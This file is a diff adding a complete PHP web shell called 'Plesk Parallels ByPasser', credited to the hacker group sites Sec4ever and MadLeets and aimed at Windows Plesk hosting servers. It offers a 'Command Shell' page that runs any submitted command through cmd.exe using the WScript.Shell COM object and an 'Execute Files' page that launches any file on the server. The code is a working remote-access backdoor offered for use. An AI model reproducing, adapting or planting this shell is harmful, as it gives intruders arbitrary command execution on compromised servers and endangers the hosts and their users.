@@ -1,0 +1,105 @@
+<?php
+# Plesk Parallels ByPasser v0.1
+# Coded by 1337b0x
+# Sec4ever.com & MadLeets.com
+
+?>
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<title># Parallels Windows Bypasser - By 1337b0x </title>
+</head>
+
+<p align="center">
+<img border="0" src="http://thevarguy.com/site-files/thevarguy.com/files/archive/thevarguy.com/wp-content/uploads/2009/12/Parallels_logo.jpg" width="535" height="214"></p>
+<p align="center">
+<font face="Tahoma">[ <font color="#FF0000"><a href="?">
+<span style="text-decoration: none"><font color="#FF0000">Home</font></span></a></font> 
+]&nbsp; [ <font color="#FF0000"><a href="?action=command">
+<span style="text-decoration: none"><font color="#FF0000">Command Shell</font></span></a></font> 
+] [ <font color="#FF0000"><a href="?action=exec">
+<span style="text-decoration: none"><font color="#FF0000">Execute Files</font></span></a></font> 
+]</font></p>
+
+
+<?php
+if($_REQUEST['action'] == "command")
+{
+?>
+<form method="Post" Action="?action=command">
+<p align="center">
+&nbsp;</p>
+<p align="center"><font face="Tahoma">&nbsp;<font color="#FF0000">Command</font>&nbsp;
+<input type="text" name="Command" value="<?php if(isset($_POST['Command'])) echo $_POST['Command']; else echo 'whoami' ?>" size="54" style="font-family: Tahoma; color: #FF0000; border: 1px dotted #FF0000" >&nbsp;&nbsp;
+</font>
+<p align="center"><font face="Tahoma">
+<input type="submit" value="Execute" style="font-family: Tahoma; color: #FF0000; border: 1px dotted #FF0000"></font></p>
+<p align="center">&nbsp;</p>
+
+<?php
+$Command = $_POST['Command'];
+if(isset($Command) && $Command == "")
+{
+echo '<center><textarea rows="1" cols="105" style="font-family: Tahoma; color: #FF0000; border: 1px dotted #FF0000" name="ExecutedCommand">';
+echo'[+] Command Is NULL or Undefined or Access Is Denied , Try Again With Another Command';
+echo'</textarea>';
+}
+if(isset($Command) && $Command != "")
+{
+echo'<p align="center"><font face="Tahoma" color="#FF0000">&nbsp;[*] Executed Command</font></p>
+<p align="center">
+<textarea rows="25" cols="94" style="font-family: Tahoma; color: #FF0000; border: 1px dotted #FF0000" name="ExecutedCommand">
+';
+$Wscript = new COM('Wscript.Shell') or die("WScript Shell Is Not Active !");
+$Execute = $Wscript->Exec("cmd.exe /c".$_REQUEST['Command']."");
+$StdOut = $Execute->StdOut();
+$Result = $StdOut->ReadAll();
+echo $Result;
+echo'</textarea></p>';
+}
+}
+if($_REQUEST['action'] == "exec")
+{
+?>
+<form method="Post" action="?action=exec">
+<p align="center">
+&nbsp;</p>
+<p align="center"><font face="Tahoma">&nbsp;<font color="#FF0000">File </font>&nbsp;
+<input type="text" name="FilePath" value="<?php echo getcwd();?>" size="54" style="font-family: Tahoma; color: #FF0000; border: 1px dotted #FF0000" >&nbsp;&nbsp;
+</font>
+<p align="center"><font face="Tahoma">
+<input type="submit" value="Execute" style="font-family: Tahoma; color: #FF0000; border: 1px dotted #FF0000"></font></p>
+<p align="center">&nbsp;</p>
+<?php
+$FilePath = $_POST['FilePath'];
+if(isset($FilePath) && ($FilePath == NULL || $FilePath == ""))
+{
+echo '<center><textarea rows="1" cols="105" style="font-family: Tahoma; color: #FF0000; border: 1px dotted #FF0000" name="ExecutedCommand">';
+echo'[+] File Path Is In Correct , Try Again';
+echo'</textarea>';
+}
+elseif(isset($FilePath) && !file_exists($FilePath))
+{
+echo'<center><textarea rows="1" cols="28" style="font-family: Tahoma; color: #FF0000; border: 1px dotted #FF0000" name="ExecutedCommand">[+] File Does Not Exist !</textarea>';
+echo'</textarea>';
+}
+else if(isset($FilePath) && file_exists($FilePath))
+{
+echo'<center><textarea rows="9" cols="105" style="font-family: Tahoma; color: #FF0000; border: 1px dotted #FF0000" name="ExecutedCommand">[+] I Found Your File , I Am Going To Execute it ';
+$WshShell = new COM("WScript.Shell"); 
+$Exec = $WshShell->Run($FilePath, 7, false); 
+echo "\n[+] Executed Succssfully !";
+echo "\n[+] The End ";
+echo'</textarea>';
+}
+
+}
+?>
+<p align="center">&nbsp;</p>
+<p align="center">&nbsp;</p>
+<p align="center"><font face="Verdana" size="1">&nbsp; Created For
+<font color="#FF0000">Plesk Servers</font> | Coded by <font color="#FF0000">
+1337b0x</font> | <font color="#FF0000">Sec4ever</font>.com -
+<font color="#FF0000">MadLeets</font>.com</font></p>
+<p align="center">&nbsp;</p>
+<p align="center">&nbsp;</p>
+<p align="center">&nbsp;</p>
